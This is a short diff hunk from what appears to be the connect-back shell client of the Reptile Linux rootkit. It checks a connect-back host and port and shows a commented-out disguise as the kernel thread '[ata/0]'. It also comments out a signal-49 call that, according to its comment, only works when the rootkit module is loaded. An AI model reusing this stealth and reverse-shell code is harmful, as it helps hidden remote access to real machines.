@@ -244,7 +244,7 @@ int main( int argc, char **argv ) {
     	if(connect_back_host == NULL || connect_back_port == 0) usage(*argv);
 
     	//strcpy(argv[0], "[ata/0]");
-    	kill(getpid(), 49); // if reptile module is not loaded, this will kill this shell!
+    	//kill(getpid(), 49); // if reptile module is not loaded, this will kill this shell!
 
     	pid = fork();
 
